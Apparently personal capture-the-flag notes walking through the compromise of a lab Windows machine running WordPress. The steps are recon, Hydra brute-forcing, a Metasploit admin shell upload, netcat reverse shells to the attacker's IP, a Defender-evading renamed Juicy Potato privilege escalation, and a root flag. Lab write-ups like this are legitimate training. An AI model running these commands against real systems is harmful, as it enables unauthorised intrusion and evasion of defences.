# 10.10.10.29

---

## nmap -sS -sC -sV -O -oX ./nmap/init.xml 10.10.10.29

```
80/tcp   open  http    Microsoft IIS httpd 10.0
3306/tcp open  mysql   MySQL (unauthorized)
```

---

## Let's check the website

Burp doesn't give anything useful. The site is just a huge PNG with a link attached to it.

Source and Cookies doesn't have any surprises either. Next is gobuster.

---

## gobuster -u 10.10.10.29 -w ./../SecLists-2021.2/Discovery/Web-Content/common.txt dir

Reveals `/wordpress`. Is accessible.

---

## Let's explore the site

There is a `index.php` handling the linkage.

There are some data files for things like comments(?). They don't reveal any secret links in the backend.

---

## There is an admin account in the system.

Blog posts seems to be signed under `admin`.

But trying to reach `http://10.10.10.29/wordpress/index.php/author/admin/` fails and returns:
```
DAEMONIZE: pcntl_fork() does not exists, moving on...
SOC_ERROR: 10061: No connection could be made because the target machine actively refused it.
```

---

## There is a login page for `Wordpress`.

There is a cookie.

wordpress_test_cookie = WP+Cookie+check

Seems to be a dummy cookie. We may not need to enumerate the cookie or temper with it.

---

## Trying to log in with random values.

Burp found these in the package:
```
log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.10.29%2Fwordpress%2Fwp-admin%2F&testcookie=1
```
testcookie=1 might be preventing us from actually sending in a valid login request.

---

## Sending the request with testcookie=0 doesn't return anything different.

---

## There is a password reset link.

Trying to reset `admin` password fails due to:
```
The email could not be sent.
Possible reason: your host may have disabled the mail() function.
```

What is mail() function? Missing library in the backend? Disabled API functionality?

---

## Brute forcing the login with Hydra

++ [Helper Blog](https://bentrobotlabs.wordpress.com/2018/04/02/web-site-login-brute-forcing-with-hydra/)

Can `redirect_to` be manipulated for fun stuff?

Command to run:
```
hydra -l admin -P ./../SecLists-2021.2/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt 10.10.10.29 http-form-post "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.10.29%2Fwordpress%2Fwp-admin%2F&testcookie=1:ERROR"
```

This was fabricated from examining the requests through both Dev Tools and Burp. I am not %100 sure about the `ERROR` part however.

---

## In the mean time I looked into MySql port.

I am not able to connect and with some digging around it should have been obvious from the beginning. `(Unauthorized)` means my IP is not allowed to connect to the server.

I probably need local access which is where admin account and access comes into play I am guessing.

++ [Source](https://security.stackexchange.com/questions/134873/what-mysql-unauthorized-french-means-when-perfoming-nmap-in-port-3306)

---

## Walkthrough exposes the password to be `P@s5w0rd!`

I don't like using the passwords gained from previous machines but whatever.

We are in and next step is to get a shell up and running.

Metasploit has an exploit in store so moving on with that.

---

## Using Metasploit to get netcat binary on the target.

Commands to run:
```
msfconsole
msf > use exploit/unix/webapp/wp_admin_shell_upload
msf > set PASSWORD P@s5w0rd!
msf > set USERNAME admin
msf > set TARGETURI /wordpress
msf > set RHOSTS 10.10.10.29
msf > run
```

It didn't open up a session however.

How the hell do I connect and run a remote .exe?

Also `msf >` does not recognize `lcd` command.

---

## After some fixes the exploit works.

The default IP adress for local host was wrong and I needed to fix that. Now it works.

We navigate to a writeable folder at `C:/inetpub/wwwroot/wordpress/wp-content/uploads`

We upload `Netcat` on the target machine.

We setup a listener locally and run the uploaded program.
```
msf > execute -f nc.exe -a "-e cmd.exe 10.10.16.133 4443"
```

---

## Remote Netcat does not work.

What's better is that `sysinfo` returns `Windows NT SHIELD 10.0 build 14393 (Windows Server 2016) i586` but the command line only accepts unix commands.

It does not recognize Window commands.

---

## Next step is to exploit with a local binary.

[Rotten Potato](https://github.com/ohpe/juicy-potato) exploit can be uploaded onto the server and we can try to run it.

But the `js.exe`(Renamed for Defender bypass) is not recognized as an executeable.

Using `execute -f` creates a process but `shell.bat` that `js.exe` is spouse to run never connects back to our local listener.

```
execute -f js.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337
Process 4808 created.
```

---

## Got back the second day.

I fixed the local host problem with `metasploit` and got the exploit up and running.

---

## NetCat

I downloaded the `nc.exe` and uploaded it to the target system.

This is the 32 bit version an I renamed it.

Now we can run it on the target system to get a stable shell.
```
execute -f nc32.exe -a "-e cmd.exe 10.10.16.133 443"
```

---

## Now we can upload rotten potato and continue.

Since the files from last session is still present and I can't upload the files with the same name. Also I cannot delete them on the target system for some reason, so I renamed everything.

---

## The potato didn't work.

Mostly my fault because I forgot to change the command line script and fix the `shell.bat` to use my port.

But I did upload `WinPEAS` to see how else I could exploit it and there are quite a bit of options there. 6 at the very least. Far more if you want to do path injections.

Here is a sniplet:
```
[!] CVE-2019-1064 : VULNERABLE
  [>] https://www.rythmstick.net/posts/cve-2019-1064/

 [!] CVE-2019-1130 : VULNERABLE
  [>] https://github.com/S3cur3Th1sSh1t/SharpByeBear

 [!] CVE-2019-1315 : VULNERABLE
  [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html

 [!] CVE-2019-1388 : VULNERABLE
  [>] https://github.com/jas502n/CVE-2019-1388

 [!] CVE-2019-1405 : VULNERABLE
  [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/
  [>] https://github.com/apt69/COMahawk

 [!] CVE-2020-1013 : VULNERABLE
  [>] https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/

 [*] Finished. Found 6 potential vulnerabilities.
```

---

## Creating the shell script.

Creating the `shell_cp.bat`
```
echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.16.133 4443 > shell_cp.bat
```

---

## Running the script to get admin shell back.


```
js_cpy.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell_cp.bat -l 1337 -c {bb6df56b-cace-11dc-9992-0019b93a3a84}
```

---

## And we are done.

```
root.txt:
	~~6e9a9fdc6f64e410a68b847bb4b404fa~~
```
